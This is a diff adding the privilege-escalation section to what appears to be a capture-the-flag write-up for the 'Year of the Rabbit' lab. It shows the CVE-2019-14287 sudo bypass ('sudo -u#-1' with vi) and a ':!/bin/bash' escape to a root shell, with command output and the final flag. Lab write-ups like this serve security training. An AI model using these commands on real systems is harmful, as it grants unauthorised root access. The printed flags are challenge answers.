@@ -619,6 +619,65 @@ THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
 
 ## Flag 2 - Vertical Privilege Escalation
 
+Now that we're the user ```gwendoline``` the first thing we should do is check for ```sudo``` privileges with ```sudo -l```.
+
+```
+gwendoline@year-of-the-rabbit:~$ sudo -l
+Matching Defaults entries for gwendoline on year-of-the-rabbit:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+gwendoline@year-of-the-rabbit:~$ 
+```
+
+So we can run ```/usr/bin/vi``` with sudo, as any user except root (```!root```), but _only_ to open ```/home/gwendoline/user.txt```.
+
+At first it may seem like there's nothing we can do with this, except there is a vulnerability in this version of sudo.
+
+We can run this program as any user with sudo (except root), by specifying the user with ```sudo -u#``` followed by the user id number. We can't use root whose id number is ```0```. But if we use ```-1``` as the user id, sudo can't find the ```-1``` user so it defaults to user ```0``` (root).
+
+Here's an article with a better explanation on [CVE-2019-14287](https://www.mend.io/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/ "Article on CVE-2019-14287").
+
+Time to execute the exploit by opening ```/home/gwendoline/user.txt``` with ```usr/bin/vi``` as the negative -1 user with sudo privileges (```sudo -u#-1```). The full command should look like this...
+
+
+```sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt```
+
+Once the ```vim``` editor has opened type ```:!/bin/bash``` to get a root shell.
+
+Once we finish executing the command we should see the following...
+
+```root@year-of-the-rabbit:/home/gwendoline#```
+
+We can verify we're root with ```whoami``` and where we are with ```pwd```.
+
+```
+root@year-of-the-rabbit:/home/gwendoline# whoami
+root
+
+root@year-of-the-rabbit:/home/gwendoline# pwd
+/home/gwendoline
+```
+
+Now to find the ```root.txt``` file all we need to do is list all contents of the ```/root``` directory with ```ls -la```.
+
+```
+root@year-of-the-rabbit:/home/gwendoline# ls -la /root
+total 20
+drwx------  2 root root 4096 Jan 23  2020 .
+drwxr-xr-x 23 root root 4096 Jan 23  2020 ..
+lrwxrwxrwx  1 root root    9 Jan 23  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r--  1 root root  140 Nov 19  2007 .profile
+-rw-r-----  1 root root   46 Jan 23  2020 root.txt
+```
+
+Finally, once we've read the ```root.txt``` file we'll find our last flag...
+
+```THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}```
+
 ---
 
 ### [Back To Top](#year-of-the-rabbit "Jump To Top")
